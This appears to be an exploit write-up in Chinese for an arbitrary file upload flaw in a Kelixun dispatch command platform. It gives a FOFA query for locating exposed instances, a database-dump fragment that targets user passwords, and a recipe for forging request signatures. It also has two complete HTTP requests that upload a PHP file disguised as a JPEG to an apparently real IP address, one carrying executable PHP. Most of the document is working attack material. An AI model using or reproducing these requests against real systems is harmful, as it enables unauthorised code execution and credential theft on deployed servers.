# 福建科立讯通信有限公司指挥调度管理平台 任意文件上传

    ## fofa

```
body="指挥调度管理平台"
```

-D unionpbx -T local_users -C usr_number usr_password

sign=md5($usernumber.$timestamp.$_usr_password);

## Exp1 api/client/upload_msg_file.php

```
POST /api/client/upload_msg_file.php?sign=f67e784ea8458572f133d83dd0f617e6×tamp=1628848416067&usernumber=1035 HTTP/1.1
Host: 111.21.226.162:7080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=8c3050f5f7ab5c1d49dbe73dcc7a8d8e
Connection: close
Content-Length: 273
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxzUhGld6cusN3Alk

------WebKitFormBoundaryxzUhGld6cusN3Alk
Content-Disposition: form-data; name="type"

1
------WebKitFormBoundaryxzUhGld6cusN3Alk
Content-Disposition:form-data; name="file"; filename="1.php"
Content-Type: image/jpeg

11123
------WebKitFormBoundaryxzUhGld6cusN3Alk--
```

## exp2 custom/zx/fax/send_fax.php

```
POST /custom/zx/upload_msg_file.php?sign=f67e784ea8458572f133d83dd0f617e6×tamp=1628848416067&usernumber=1035 HTTP/1.1
Host: 111.21.226.162:7080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=8c3050f5f7ab5c1d49dbe73dcc7a8d8e
Connection: close
Content-Length: 304
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5QxDE3I4sjzDvg3O

------WebKitFormBoundary5QxDE3I4sjzDvg3O
Content-Disposition: form-data; name="type"

1
------WebKitFormBoundary5QxDE3I4sjzDvg3O
Content-Disposition:form-data; name="file"; filename="1.php"
Content-Type: image/jpeg

<?php phpinfo(); unlink(__FILE__);?>
------WebKitFormBoundary5QxDE3I4sjzDvg3O--
```
